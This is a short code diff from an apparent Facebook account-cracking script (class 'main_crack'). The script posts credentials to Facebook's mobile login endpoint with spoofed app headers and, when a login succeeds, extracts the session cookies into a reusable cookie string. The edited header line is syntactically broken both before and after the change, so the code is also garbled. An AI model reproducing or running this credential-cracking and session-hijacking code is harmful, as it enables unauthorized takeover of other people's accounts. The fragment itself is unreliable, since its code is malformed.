@@ -271,7 +271,7 @@ class main_crack():
                     "X-Tigon-Is-Retry":"False",
                     "X-FB-Friendly-Name":"authenticate",
                     "Content-Type":"application\/x-www-form-urlencoded",
-                    "Content-Length":"1083"},"
+                    "Content-Length":"1083"}",
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
